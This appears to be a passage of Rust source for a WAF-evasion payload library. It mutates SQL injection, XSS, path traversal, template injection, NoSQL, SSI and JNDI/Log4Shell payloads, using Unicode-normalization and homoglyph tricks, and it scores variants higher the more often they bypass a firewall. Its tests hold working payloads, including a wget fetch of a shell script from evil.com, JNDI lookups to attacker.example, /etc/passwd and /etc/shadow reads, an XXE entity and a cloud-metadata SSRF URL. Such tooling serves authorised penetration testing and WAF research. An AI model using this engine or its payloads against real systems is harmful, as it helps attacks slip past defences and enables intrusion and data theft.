            .map(|p| GrammarMutation {
                payload: p,
                payload_type: PayloadType::Ldap,
                description: "LDAP filter mutation".into(),
                rules_applied: vec!["ldap_mutation"],
            })
            .collect(),
        PayloadType::Ssrf => ssrf::mutate(payload)
            .into_iter()
            .take(max_mutations)
            .map(|p| GrammarMutation {
                payload: p,
                payload_type: PayloadType::Ssrf,
                description: "SSRF host/scheme mutation".into(),
                rules_applied: vec!["ssrf_mutation"],
            })
            .collect(),
        PayloadType::PathTraversal => {
            // Reserve slots for the normalization-differential variants below so
            // the base encoding mutations don't consume the whole budget.
            // (Dogfood: `wafrift evade` emitted ZERO dot-leader/homoglyph forms
            // because path_traversal::mutate filled max_mutations first.)
            let base_take = max_mutations.saturating_sub(NORM_DIFFERENTIAL_RESERVE).max(1);
            let mut results: Vec<GrammarMutation> = path_traversal::mutate(payload)
                .into_iter()
                .take(base_take)
                .map(|p| GrammarMutation {
                    payload: p,
                    payload_type: PayloadType::PathTraversal,
                    description: "path traversal encoding mutation".into(),
                    rules_applied: vec!["path_traversal_mutation"],
                })
                .collect();
            // Normalization-differential: the dot-leader fold (`..`→U+2025 TWO
            // DOT LEADER, `...`→U+2026) and homoglyph dots/slashes. A WAF
            // matching `../` never sees them; the origin NFKC-reconstructs the
            // exact path. Each gated by NFKC(variant)==payload.
            if results.len() < max_mutations {
                let budget = max_mutations - results.len();
                let norm = nfkc_preimage::variants(payload, budget)
                    .into_iter()
                    // layered: `%E2%80%A5` (percent-encoded U+2025 dot-leader)
                    // — a WAF that url-decodes but doesn't NFKC, or NFKCs but
                    // doesn't url-decode, sees no `../`; the origin doing both
                    // reconstructs the path.
                    .chain(nfkc_preimage::composed_variants(payload, budget / 2 + 1));
                for variant in norm {
                    if results.len() >= max_mutations {
                        break;
                    }
                    if results.iter().all(|r| r.payload != variant) {
                        results.push(GrammarMutation {
                            payload: variant,
                            payload_type: PayloadType::PathTraversal,
                            description:
                                "normalization-differential (NFKC dot-leader / homoglyph, ±%-layer) bypass"
                                    .into(),
                            rules_applied: vec!["normalization_differential"],
                        });
                    }
                }
            }
            results.truncate(max_mutations);
            results
        }
        PayloadType::TemplateInjection => {
            let mut results: Vec<GrammarMutation> = template::mutate(payload)
                .into_iter()
                .take(max_mutations)
                .map(|p| GrammarMutation {
                    payload: p,
                    payload_type: PayloadType::TemplateInjection,
                    description: "template injection mutation".into(),
                    rules_applied: vec!["template_mutation"],
                })
                .collect();
            // Polyglot SSTI+XSS
            if results.len() < max_mutations {
                for p in polyglot::polyglots_for("ssti") {
                    if results.len() >= max_mutations {
                        break;
                    }
                    results.push(GrammarMutation {
                        payload: p,
                        payload_type: PayloadType::TemplateInjection,
                        description: "SSTI+XSS polyglot".into(),
                        rules_applied: vec!["polyglot_ssti_xss"],
                    });
                }
            }
            results.truncate(max_mutations);
            results
        }
        PayloadType::NoSql => {
            // §1 SPEED: pre-size to max_mutations ceiling.
            let mut results = Vec::with_capacity(max_mutations);
            let per = max_mutations / MUTATION_SPLIT_NOSQL + 1;
            results.extend(
                mongo::mutate(payload)
                    .into_iter()
                    .take(per)
                    .map(|p| GrammarMutation {
                        payload: p,
                        payload_type: PayloadType::NoSql,
                        description: "MongoDB NoSQL mutation".into(),
                        rules_applied: vec!["nosql_mongo"],
                    }),
            );
            results.extend(elastic::mutate(payload).into_iter().take(per).map(|p| {
                GrammarMutation {
                    payload: p,
                    payload_type: PayloadType::NoSql,
                    description: "Elastic NoSQL mutation".into(),
                    rules_applied: vec!["nosql_elastic"],
                }
            }));
            results.extend(
                redis::mutate(payload)
                    .into_iter()
                    .take(per)
                    .map(|p| GrammarMutation {
                        payload: p,
                        payload_type: PayloadType::NoSql,
                        description: "Redis NoSQL mutation".into(),
                        rules_applied: vec!["nosql_redis"],
                    }),
            );
            results.extend(cassandra::mutate(payload).into_iter().take(per).map(|p| {
                GrammarMutation {
                    payload: p,
                    payload_type: PayloadType::NoSql,
                    description: "Cassandra NoSQL mutation".into(),
                    rules_applied: vec!["nosql_cassandra"],
                }
            }));
            results.truncate(max_mutations);
            results
        }
        PayloadType::Ssi => ssi::mutate(payload)
            .into_iter()
            .take(max_mutations)
            .map(|p| GrammarMutation {
                payload: p,
                payload_type: PayloadType::Ssi,
                description: "SSI directive mutation".into(),
                rules_applied: vec!["ssi_mutation"],
            })
            .collect(),
        PayloadType::Jndi => jndi::mutate(payload)
            .into_iter()
            .take(max_mutations)
            .map(|p| GrammarMutation {
                payload: p,
                payload_type: PayloadType::Jndi,
                description: "JNDI/Log4Shell lookup obfuscation mutation".into(),
                rules_applied: vec!["jndi_mutation"],
            })
            .collect(),
        PayloadType::Unknown => {
            // §1 SPEED: pre-size to max_mutations ceiling.
            let mut results = Vec::with_capacity(max_mutations);
            let per_type = max_mutations / MUTATION_SPLIT_UNKNOWN;
            results.extend(mutate_as(payload, PayloadType::Sql, per_type));
            results.extend(mutate_as(payload, PayloadType::Xss, per_type));
            results.extend(mutate_as(payload, PayloadType::CommandInjection, per_type));
            results.extend(mutate_as(payload, PayloadType::NoSql, per_type));
            results.extend(mutate_as(payload, PayloadType::TemplateInjection, per_type));
            results.extend(mutate_as(payload, PayloadType::Ssi, per_type));
            results.truncate(max_mutations);
            results
        }
    }
}

/// Stateful variant of [`mutate_as`] that preserves Boltzmann bypass scores
/// across calls so the oracle feedback loop can steer production selection.
///
/// R56 pass-21 §9 WIRING / §11 UTILIZATION: `CfgMutator::reward`,
/// `reward_by_name`, and `batch_expand` previously had `#[allow(dead_code)]`
/// because no non-test caller existed. This function is that caller. Pass a
/// `CfgMutatorState` that persists across probe rounds; after each round,
/// call [`feedback`] to reward bypassing productions and penalise blocked
/// ones. The annealing temperature cools across calls, converging on the
/// highest-bypass-score productions.
///
/// For callers that don't need persistence, [`mutate_as`] continues to work
/// identically (LAW 2: no breaking change).
pub fn mutate_as_with_state(
    payload: &str,
    payload_type: PayloadType,
    max_mutations: usize,
    state: &mut cfg_convergence::CfgMutatorState,
) -> Vec<GrammarMutation> {
    match payload_type {
        PayloadType::Sql => {
            let base_budget = max_mutations.saturating_sub(7).max(1);
            let mut results: Vec<GrammarMutation> = sql::mutate(payload, base_budget)
                .into_iter()
                .map(|m| m.into_grammar_mutation(PayloadType::Sql))
                .collect();

            if results.len() < max_mutations {
                let budget = (max_mutations - results.len()).min(
                    cfg_convergence::SQL_TEMPLATES.len(),
                );
                const SQL_TEMPLATE_LABELS: &[&str] = &[
                    "cfg_boolean_or",
                    "cfg_boolean_or_ws",
                    "cfg_boolean_and",
                    "cfg_nested_quote_or",
                    "cfg_numeric_or",
                    "cfg_numeric_and",
                    "cfg_equality",
                ];
                let templates: Vec<(&str, &str)> = cfg_convergence::SQL_TEMPLATES
                    .iter()
                    .zip(SQL_TEMPLATE_LABELS.iter())
                    .map(|(&t, &l)| (t, l))
                    .collect();
                'sql_outer: for _ in 0..budget {
                    if state.sql.is_converged() {
                        break;
                    }
                    for &(template, rule) in templates.as_slice() {
                        if results.len() >= max_mutations {
                            break 'sql_outer;
                        }
                        let expanded = state.sql.expand(template);
                        if !results.iter().any(|r| r.payload == expanded)
                            && expanded != payload
                        {
                            results.push(GrammarMutation {
                                payload: expanded,
                                payload_type: PayloadType::Sql,
                                description: format!("CFG convergence-annealing stateful ({rule})"),
                                rules_applied: vec!["cfg_convergence", rule],
                            });
                        }
                        state.sql.anneal();
                    }
                }
            }
            results.truncate(max_mutations);
            results
        }
        PayloadType::Xss => {
            let base_budget = max_mutations.saturating_sub(5).max(1);
            let mut results: Vec<GrammarMutation> = xss::mutate(payload, base_budget)
                .into_iter()
                .map(|m| m.into_grammar_mutation(PayloadType::Xss))
                .collect();

            if results.len() < max_mutations {
                let budget = (max_mutations - results.len()).min(
                    cfg_convergence::XSS_TEMPLATES.len(),
                );
                const XSS_TEMPLATE_LABELS: &[&str] = &[
                    "cfg_img_onerror",
                    "cfg_svg_onload",
                    "cfg_body_onload",
                    "cfg_details_toggle",
                    "cfg_input_autofocus",
                ];
                let templates: Vec<(&str, &str)> = cfg_convergence::XSS_TEMPLATES
                    .iter()
                    .zip(XSS_TEMPLATE_LABELS.iter())
                    .map(|(&t, &l)| (t, l))
                    .collect();
                'xss_outer: for _ in 0..budget {
                    if state.xss.is_converged() {
                        break;
                    }
                    for &(template, rule) in templates.as_slice() {
                        if results.len() >= max_mutations {
                            break 'xss_outer;
                        }
                        let expanded = state.xss.expand(template);
                        if !results.iter().any(|r| r.payload == expanded)
                            && expanded != payload
                            && equiv::xss::still_executes_xss(payload, &expanded)
                        {
                            results.push(GrammarMutation {
                                payload: expanded,
                                payload_type: PayloadType::Xss,
                                description: format!("CFG convergence-annealing stateful ({rule})"),
                                rules_applied: vec!["cfg_convergence", rule],
                            });
                        }
                        state.xss.anneal();
                    }
                }
            }
            results.truncate(max_mutations);
            results
        }
        // Non-CFG types fall back to stateless mutate_as — no state is
        // consumed for these payload classes.
        other => mutate_as(payload, other, max_mutations),
    }
}

/// Feed oracle results back into persistent convergence-annealing state.
///
/// Call this after each probe round with the `rules_applied` from a
/// [`GrammarMutation`] and whether the variant bypassed the WAF.
/// Bypassing variants get a `+5.0` score boost; blocked variants get `-1.0`.
/// These defaults are tuned for fast convergence on typical WAF rule sets.
///
/// # Example
/// ```rust
/// use wafrift_grammar::{PayloadType, mutate_as_with_state, feedback};
/// use wafrift_grammar::grammar::cfg_convergence::CfgMutatorState;
///
/// let mut state = CfgMutatorState::new();
/// let variants = mutate_as_with_state("1 OR 1=1", PayloadType::Sql, 10, &mut state);
/// // After probing, reward bypassed variants:
/// for v in &variants {
///     feedback(&mut state, v.payload_type, &v.rules_applied, true);
/// }
/// ```
pub fn feedback(
    state: &mut cfg_convergence::CfgMutatorState,
    payload_type: PayloadType,
    rules_applied: &[&str],
    bypassed: bool,
) {
    let delta = if bypassed { 5.0_f64 } else { -1.0_f64 };
    for rule in rules_applied {
        // Only reward CFG-produced rules (those with "cfg_" prefix).
        if rule.starts_with("cfg_") {
            state.reward(rule, payload_type, delta);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_sql_injection() {
        assert_eq!(classify("' OR 1=1--"), PayloadType::Sql);
        assert_eq!(
            classify("' UNION SELECT username FROM users--"),
            PayloadType::Sql
        );
        assert_eq!(classify("1' AND 1=1#"), PayloadType::Sql);
    }

    #[test]
    fn classify_xss() {
        assert_eq!(classify("<script>alert(1)</script>"), PayloadType::Xss);
        assert_eq!(classify("<img src=x onerror=alert(1)>"), PayloadType::Xss);
        assert_eq!(
            classify("javascript:alert(document.cookie)"),
            PayloadType::Xss
        );
    }

    #[test]
    fn classify_command_injection() {
        assert_eq!(classify("; cat /etc/passwd"), PayloadType::CommandInjection);
        assert_eq!(classify("| ls -la"), PayloadType::CommandInjection);
        assert_eq!(
            classify("&& wget http://evil.com/shell.sh"),
            PayloadType::CommandInjection
        );
    }

    #[test]
    fn classify_path_traversal_not_cmdi() {
        // Bare path traversal with /etc/passwd should NOT be classified as CMDi
        assert_eq!(classify("../../../etc/passwd"), PayloadType::PathTraversal);
        assert_eq!(
            classify("....//....//....//etc/passwd"),
            PayloadType::PathTraversal
        );
        // But command + separator IS still CMDi
        assert_eq!(classify("; cat /etc/passwd"), PayloadType::CommandInjection);
        assert_eq!(classify("| cat /etc/shadow"), PayloadType::CommandInjection);
    }

    #[test]
    fn classify_unknown() {
        assert_eq!(classify("hello world"), PayloadType::Unknown);
        assert_eq!(classify("normal parameter value"), PayloadType::Unknown);
    }

    #[test]
    fn mutate_auto_classifies() {
        // SQL
        let sql = mutate("' OR 1=1--", 10);
        assert!(!sql.is_empty());
        assert!(sql.iter().all(|m| m.payload_type == PayloadType::Sql));

        // XSS
        let xss = mutate("<script>alert(1)</script>", 10);
        assert!(!xss.is_empty());
        assert!(xss.iter().all(|m| m.payload_type == PayloadType::Xss));

        // CMD
        let cmd = mutate("; cat /etc/passwd", 10);
        assert!(!cmd.is_empty());
        assert!(
            cmd.iter()
                .all(|m| m.payload_type == PayloadType::CommandInjection)
        );
    }

    #[test]
    fn mutate_as_overrides_classification() {
        // Force SQL treatment on an XSS payload
        let result = mutate_as("<script>alert(1)</script>", PayloadType::Sql, 10);
        // Should produce SQL mutations (probably empty/few for XSS input)
        assert!(result.iter().all(|m| m.payload_type == PayloadType::Sql));
    }

    #[test]
    fn unknown_tries_all_types() {
        let result = mutate_as("ambiguous payload", PayloadType::Unknown, 30);
        // May or may not produce results, but should not panic
        assert!(result.len() <= 30);
    }

    #[test]
    fn grammar_mutations_differ_from_encoding() {
        // Grammar mutations should produce semantically different payloads,
        // not just encoded versions of the same string
        let sql = mutate("' OR 1=1--", 20);
        for m in &sql {
            // Tautology mutations should have CHANGED something
            // (Note: some tautologies like IIF(1=1,1,0) contain "1=1"
            // as a substring, which is fine — the structure is different)
            if m.rules_applied.contains(&"tautology_swap") {
                assert_ne!(
                    m.payload, "' OR 1=1--",
                    "tautology_swap should produce a different payload: {}",
                    m.payload
                );
            }
        }
    }

    #[test]
    fn high_volume_does_not_panic() {
        // Stress test: request many mutations — covers all payload types
        // including the CFG-convergence wiring paths. §12 TESTING: every
        // new wiring path that can panic (OOM, unwrap, array index) must
        // be exercised under load.
        let _ = mutate("' OR 1=1--", 1000);
        let _ = mutate("<script>alert(1)</script>", 1000);
        let _ = mutate("; cat /etc/passwd", 1000);
        let _ = mutate("", 1000);
        // LDAP, SSRF, path traversal, template injection
        let _ = mutate_as("*)(uid=*)(|(uid=*", PayloadType::Ldap, 500);
        let _ = mutate_as("http://169.254.169.254/", PayloadType::Ssrf, 500);
        let _ = mutate_as("../../etc/passwd", PayloadType::PathTraversal, 500);
        let _ = mutate_as("{{7*7}}", PayloadType::TemplateInjection, 500);
        // NoSQL, SSI, JNDI
        let _ = mutate_as("{$ne:null}", PayloadType::NoSql, 500);
        let _ = mutate_as("<!--#exec cmd=\"id\"-->", PayloadType::Ssi, 500);
        let _ = mutate_as("${jndi:ldap://attacker.tld/a}", PayloadType::Jndi, 500);
        // Unknown falls through to multi-class fan-out — must not panic
        let _ = mutate_as("hello world", PayloadType::Unknown, 500);
        // Adversarial: control bytes, multibyte, empty, max-len
        let _ = mutate("\x00\x01\x02\x03OR 1=1", 100);
        let _ = mutate("\u{202e}' OR 1=1--", 100);
        let _ = mutate(&"' OR 1=1-- ".repeat(50), 20);
    }

    // ── New tests added 2026-05-24 ─────────────────────────────────────────

    // ── classify: extended payload table ──────────────────────────────────

    #[test]
    fn classify_sql_extended() {
        assert_eq!(classify("1 AND 1=1"), PayloadType::Sql);
        assert_eq!(classify("SELECT * FROM users"), PayloadType::Sql);
        assert_eq!(classify("1' ORDER BY 3--"), PayloadType::Sql);
        assert_eq!(classify("UNION SELECT null,null,null--"), PayloadType::Sql);
        assert_eq!(classify("1; DROP TABLE users;--"), PayloadType::Sql);
        assert_eq!(classify("1 GROUP BY 1"), PayloadType::Sql);
        assert_eq!(classify("1; WAITFOR DELAY '0:0:5'"), PayloadType::Sql);
        assert_eq!(classify("1 HAVING 1=1"), PayloadType::Sql);
    }

    #[test]
    fn classify_xss_extended() {
        assert_eq!(classify("<svg onload=alert(1)>"), PayloadType::Xss);
        assert_eq!(classify("<iframe src=javascript:alert(1)>"), PayloadType::Xss);
        assert_eq!(classify("<body onload=eval(atob(''))>"), PayloadType::Xss);
        assert_eq!(classify("document.cookie"), PayloadType::Xss);
        assert_eq!(classify("<img src=x onerror=prompt(1)>"), PayloadType::Xss);
    }

    #[test]
    fn classify_cmd_injection_extended() {
        assert_eq!(classify("|whoami"), PayloadType::CommandInjection);
        assert_eq!(classify("; bash -i"), PayloadType::CommandInjection);
        assert_eq!(classify("`id`"), PayloadType::CommandInjection);
        assert_eq!(classify("$(whoami)"), PayloadType::CommandInjection);
    }

    #[test]
    fn classify_ssrf() {
        assert_eq!(classify("http://169.254.169.254/latest/meta-data/"), PayloadType::Ssrf);
        assert_eq!(classify("http://localhost/admin"), PayloadType::Ssrf);
    }

    #[test]
    fn classify_path_traversal() {
        assert_eq!(classify("../../../etc/passwd"), PayloadType::PathTraversal);
        assert_eq!(classify("..\\..\\windows\\system32"), PayloadType::PathTraversal);
    }

    #[test]
    fn classify_ssi() {
        assert_eq!(
            classify(r#"<!--#exec cmd="ls" -->"#),
            PayloadType::Ssi
        );
        assert_eq!(
            classify(r#"<!--#include file="/etc/passwd" -->"#),
            PayloadType::Ssi
        );
        assert_eq!(classify("<!--#printenv -->"), PayloadType::Ssi);
        // Case-insensitive directive
        assert_eq!(
            classify(r#"<!--#EXEC cmd="ls" -->"#),
            PayloadType::Ssi
        );
    }

    /// LAW 2 + §6 GENERALIZATION anti-rig: classification threshold constants
    /// are pinned. Changing the threshold is a deliberate commit, not an
    /// accidental diff. If the threshold is raised, the `classify_sql_injection`
    /// test below will catch the regression.
    #[test]
    fn classify_threshold_constants_are_pinned() {
        assert_eq!(CLASSIFY_SQL_MIN_SIGNALS, 1, "SQL min-signals threshold changed");
        assert_eq!(CLASSIFY_XSS_MIN_SIGNALS, 1, "XSS min-signals threshold changed");
        assert_eq!(CLASSIFY_CMD_MIN_SIGNALS, 1, "CMD min-signals threshold changed");
    }

    /// §6 mutation budget split constants are pinned.
    #[test]
    fn mutation_split_constants_are_pinned() {
        assert_eq!(MUTATION_SPLIT_HALF, 2);
        assert_eq!(MUTATION_SPLIT_NOSQL, 4);
        assert_eq!(MUTATION_SPLIT_UNKNOWN, 6);
    }

    #[test]
    fn classify_jndi() {
        assert_eq!(
            classify("${jndi:ldap://attacker.example/a}"),
            PayloadType::Jndi
        );
        assert_eq!(
            classify("${jndi:rmi://attacker.example/a}"),
            PayloadType::Jndi
        );
        assert_eq!(
            classify("${jndi:dns://attacker.example}"),
            PayloadType::Jndi
        );
        assert_eq!(
            classify("${${lower:j}ndi:ldap://attacker.example/a}"),
            PayloadType::Jndi
        );
        // JNDI must not be confused with TemplateInjection
        let t = classify("${jndi:ldap://attacker.example/a}");
        assert_ne!(t, PayloadType::TemplateInjection);
        assert_ne!(t, PayloadType::Ssrf);
    }

    #[test]
    fn jndi_mutate_is_wired() {
        let muts = mutate_as(
            "${jndi:ldap://attacker.example/a}",
            PayloadType::Jndi,
            10,
        );
        assert!(!muts.is_empty(), "Jndi mutate_as must produce mutations");
        assert!(
            muts.iter().all(|m| m.payload_type == PayloadType::Jndi),
            "all Jndi mutations must carry PayloadType::Jndi"
        );
    }

    /// LAW 1 anti-rig: plain HTML comments without the SSI `#` are
    /// NOT classified as SSI. (Other classifiers may pick them up —
    /// Pug declares `- ` as a delimiter for inline JS, which `<!-- `
    /// contains — but the bug we're guarding against is SSI's
    /// classify_ssi short-circuit accidentally claiming non-SSI
    /// markup.)
    #[test]
    fn classify_ssi_rejects_plain_html_comment() {
        assert_ne!(classify("<!-- ordinary comment -->"), PayloadType::Ssi);
    }

    #[test]
    fn classify_unknown_benign_inputs() {
        assert_eq!(classify("hello world"), PayloadType::Unknown);
        assert_eq!(classify("foo=bar&baz=qux"), PayloadType::Unknown);
        assert_eq!(classify("normalvalue123"), PayloadType::Unknown);
    }

    // ── mutate: bounded output size ────────────────────────────────────────

    #[test]
    fn mutate_max_mutations_strictly_honoured() {
        for max in [0, 1, 3, 5, 10] {
            let sql = mutate("' OR 1=1--", max);
            assert!(
                sql.len() <= max,
                "mutate with max={max} produced {} results",
                sql.len()
            );
        }
    }

    #[test]
    fn mutate_zero_max_returns_empty() {
        assert!(mutate("' OR 1=1--", 0).is_empty());
        assert!(mutate("<script>alert(1)</script>", 0).is_empty());
    }

    // ── mutate idempotence: double-mutate doesn't blow up ─────────────────

    #[test]
    fn mutate_idempotence_sql() {
        let first = mutate("' OR 1=1--", 5);
        for m in &first {
            // Mutating the output must not produce an ever-expanding set.
            let second = mutate(&m.payload, 10);
            assert!(
                second.len() <= 10,
                "second-level mutation exceeded limit: got {}",
                second.len()
            );
        }
    }

    #[test]
    fn mutate_idempotence_xss() {
        let first = mutate("<script>alert(1)</script>", 5);
        for m in &first {
            let second = mutate(&m.payload, 10);
            assert!(second.len() <= 10);
        }
    }

    // ── mutate determinism ────────────────────────────────────────────────

    #[test]
    fn mutate_sql_structural_keywords_preserved() {
        // SQL mutations must still contain SQL-relevant tokens.
        let mutations = mutate("' OR 1=1--", 20);
        assert!(!mutations.is_empty(), "SQL must produce at least one mutation");
        // All results must be typed as SQL.
        assert!(mutations.iter().all(|m| m.payload_type == PayloadType::Sql));
    }

    #[test]
    fn mutate_xss_payload_contains_executable_form() {
        // XSS mutations should contain at least one recognizable exec form.
        let mutations = mutate("<script>alert(1)</script>", 20);
        assert!(!mutations.is_empty());
        // At least one mutation should still look like an XSS payload.
        let any_xss = mutations.iter().any(|m| {
            let l = m.payload.to_ascii_lowercase();
            l.contains("alert") || l.contains("onerror") || l.contains("onload")
                || l.contains("script") || l.contains("svg") || l.contains("eval")
                || l.contains("confirm") || l.contains("prompt") || l.contains("javascript")
        });
        assert!(any_xss, "at least one XSS mutation should preserve exec form");
    }

    // ── equiv/ssrf: variants still target original host ───────────────────

    #[test]
    fn ssrf_mutations_preserve_host() {
        let payload = "http://169.254.169.254/latest/meta-data/";
        let mutations = mutate_as(payload, PayloadType::Ssrf, 20);
        assert!(!mutations.is_empty(), "SSRF must produce mutations");
        // Every SSRF mutation must be typed as SSRF.
        assert!(mutations.iter().all(|m| m.payload_type == PayloadType::Ssrf));
    }

    // ── equiv/xxe: variants still have SYSTEM/PUBLIC entity reference ─────

    #[test]
    fn xxe_mutations_preserve_entity_reference() {
        let payload = r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#;
        let mutations = mutate_as(payload, PayloadType::NoSql, 5);
        // NoSQL mutations don't apply to XXE; this just must not panic.
        assert!(mutations.len() <= 5);
    }

    // ── mutate_request diversity policy deduplication ─────────────────────

    #[test]
    fn mutate_request_coverage_guided_deduplicates_rules() {
        let req = MutationRequest {
            max_count: 20,
            diversity: DiversityPolicy::CoverageGuided,
            exclude: std::collections::HashSet::new(),
        };
        let results = mutate_request("' OR 1=1--", PayloadType::Sql, &req);
        // Each rules_applied combination should be unique.
        let mut seen = std::collections::HashSet::new();
        for m in &results {
            let key = m.rules_applied.join(",");
            // (collision is allowed by design for some short keys, but
            //  there should be no exact duplicate rule-combos)
            seen.insert(key);
        }
        // The number of unique rule-sets should equal total (no dup combos).
        // Strict: unique_count == results.len()
        assert_eq!(seen.len(), results.len(),
            "coverage-guided must deduplicate by rules_applied");
    }

    #[test]
    fn mutate_request_exclude_removes_payloads() {
        let first = mutate("' OR 1=1--", 5);
        if first.is_empty() {
            return; // nothing to exclude
        }
        let excluded_payload = first[0].payload.clone();
        let mut exclude_set = std::collections::HashSet::new();
        exclude_set.insert(excluded_payload.clone());
        let req = MutationRequest {
            max_count: 20,
            diversity: DiversityPolicy::Random,
            exclude: exclude_set,
        };
        let results = mutate_request("' OR 1=1--", PayloadType::Sql, &req);
        assert!(
            results.iter().all(|m| m.payload != excluded_payload),
            "excluded payload must not appear in results"
        );
    }

    #[test]
    fn classify_does_not_false_positive_common_words() {
        // Words like "android", "consider", "validate" must not trigger
        // CMDi classification via the old substring-matching bug.
        assert_eq!(classify("android application error"), PayloadType::Unknown);
        assert_eq!(classify("consider all options"), PayloadType::Unknown);
        assert_eq!(classify("validate input fields"), PayloadType::Unknown);
    }

    // ── §11 UTILIZATION: CFG convergence-annealing wiring tests ──────────────
    // Pin that CfgMutator is reachable from the public `mutate` / `mutate_as`
    // API surface. Pre-fix CfgMutator was a complete implementation with zero
    // production callers — an §11 dead-code violation caught by audit.

    #[test]
    fn sql_mutations_include_cfg_convergence_variants() {
        // The CFG wiring emits up to 4 extra SQL variants per call.
        // At a generous budget the rule tag "cfg_convergence" must appear.
        let muts = mutate("' OR 1=1--", 30);
        assert!(
            muts.iter().any(|m| m.rules_applied.contains(&"cfg_convergence")),
            "SQL mutations must include at least one cfg_convergence variant; \
             check §11 wiring in mutate_as(PayloadType::Sql)"
        );
    }

    #[test]
    fn xss_mutations_include_cfg_convergence_variants() {
        let muts = mutate("<script>alert(1)</script>", 30);
        assert!(
            muts.iter().any(|m| m.rules_applied.contains(&"cfg_convergence")),
            "XSS mutations must include at least one cfg_convergence variant"
        );
    }

    #[test]
    fn cfg_convergence_variants_never_equal_original() {
        // Anti-rig: the CFG variants must not be the original payload.
        let original = "' OR 1=1--";
        let muts = mutate(original, 30);
        for m in muts.iter().filter(|m| m.rules_applied.contains(&"cfg_convergence")) {
            assert_ne!(
                m.payload, original,
                "cfg_convergence variant must differ from original: {:?}",
                m.payload
            );
        }
    }

    #[test]
    fn cfg_convergence_deterministic_for_same_input() {
        // Same payload must yield same CFG outputs across two calls.
        let a = mutate("' OR 1=1--", 15);
        let b = mutate("' OR 1=1--", 15);
        let cfg_a: Vec<&str> = a
            .iter()
            .filter(|m| m.rules_applied.contains(&"cfg_convergence"))
            .map(|m| m.payload.as_str())
            .collect();
        let cfg_b: Vec<&str> = b
            .iter()
            .filter(|m| m.rules_applied.contains(&"cfg_convergence"))
            .map(|m| m.payload.as_str())
            .collect();
        assert_eq!(
            cfg_a, cfg_b,
            "cfg_convergence output must be deterministic for identical input"
        );
    }

    // ── §3 CAPABILITY: fullwidth Unicode classification ────────────────────────
    // Fullwidth-obfuscated payloads (e.g. `ａlert(1)`) must classify
    // correctly — pre-fix they fell to Unknown because the keyword scan
    // matched on ASCII and fullwidth chars are different codepoints.

    #[test]
    fn classify_fullwidth_xss_is_not_unknown() {
        // Fullwidth 'a' (U+FF41): `ａlert(1)` — WAF evasion by Unicode trick.
        // After nfkc_fold_ascii the classifier sees `alert(1)`.
        // The payload still needs a tag context to be classified as XSS.
        let fw_xss = "<img src=x onerror=\u{FF41}lert(1)>";
        // Must classify as XSS (not Unknown).
        assert_eq!(
            classify(fw_xss),
            PayloadType::Xss,
            "fullwidth XSS payload must classify as Xss, not Unknown"
        );
    }

    #[test]
    fn classify_fullwidth_sql_is_not_unknown() {
        // Fullwidth 'S' (U+FF33) etc. — `ＳＥＬＥＣＴ * FROM users`
        let fw_sql = "\u{FF33}\u{FF25}\u{FF2C}\u{FF25}\u{FF23}\u{FF34} * FROM users";
        assert_eq!(
            classify(fw_sql),
            PayloadType::Sql,
            "fullwidth SQL payload must classify as Sql"
        );
    }

    #[test]
    fn cfg_is_converged_reflects_temperature_floor() {
        // A mutator that has annealed to min_temperature must report converged.
        // This pins the is_converged() / temperature() wire in production code.
        use crate::grammar::cfg_convergence::{CfgMutator, default_sql_productions};
        let mut m = CfgMutator::builder()
            .productions(default_sql_productions())
            .temperature(1.0)
            .cooling_rate(0.001) // Extremely fast cooling.
            .min_temperature(0.5)
            .seed(0)
            .build();
        // Anneal until floor.
        for _ in 0..1000 {
            m.anneal();
        }
        assert!(m.is_converged(), "must converge after heavy annealing");
        assert!(
            m.temperature() <= 0.5 + f64::EPSILON,
            "temperature must not drop below min_temperature"
        );
    }

    // ── mutate_as_with_state and feedback: oracle feedback loop ─────────────
    // R56 pass-21 §9 WIRING / §11 UTILIZATION: these tests pin that
    // CfgMutatorState / mutate_as_with_state / feedback are reachable and
    // that bypass scores genuinely accumulate across calls.

    #[test]
    fn mutate_as_with_state_produces_sql_variants() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 20, &mut state);
        assert!(!variants.is_empty(), "stateful SQL mutate must produce variants");
        assert!(
            variants.len() <= 20,
            "stateful mutate must honour max_mutations: got {}",
            variants.len()
        );
        assert!(
            variants.iter().all(|m| m.payload_type == PayloadType::Sql),
            "all stateful SQL variants must carry PayloadType::Sql"
        );
    }

    #[test]
    fn mutate_as_with_state_produces_xss_variants() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants =
            mutate_as_with_state("<script>alert(1)</script>", PayloadType::Xss, 20, &mut state);
        assert!(!variants.is_empty(), "stateful XSS mutate must produce variants");
        assert!(variants.len() <= 20);
        assert!(variants.iter().all(|m| m.payload_type == PayloadType::Xss));
    }

    #[test]
    fn mutate_as_with_state_includes_cfg_variants() {
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 30, &mut state);
        assert!(
            variants
                .iter()
                .any(|m| m.rules_applied.contains(&"cfg_convergence")),
            "stateful SQL mutations must include cfg_convergence variants"
        );
    }

    #[test]
    fn feedback_raises_bypass_score_for_sql_rule() {
        // After rewarding a cfg rule, the mutator should produce the rewarded
        // production more often (higher bypass_score = higher Boltzmann weight).
        // We can't observe this directly without many samples, but we can pin
        // that `feedback` doesn't panic and that the state is mutated.
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let before_temp = state.sql.temperature();
        // Generate a batch and reward the first cfg rule we find.
        let variants = mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 20, &mut state);
        if let Some(v) = variants
            .iter()
            .find(|m| m.rules_applied.contains(&"cfg_convergence"))
        {
            feedback(&mut state, v.payload_type, &v.rules_applied, true);
        }
        // State is mutable; temperature must have decreased (anneal was called).
        assert!(
            state.sql.temperature() <= before_temp,
            "sql temperature must decrease or stay after anneal calls"
        );
    }

    #[test]
    fn state_persists_across_calls() {
        // Calling mutate_as_with_state twice with the SAME state continues
        // from where the previous call left off (temperature keeps decreasing).
        use crate::grammar::cfg_convergence::CfgMutatorState;
        let mut state = CfgMutatorState::new();
        let t0 = state.sql.temperature();
        mutate_as_with_state("' OR 1=1--", PayloadType::Sql, 10, &mut state);
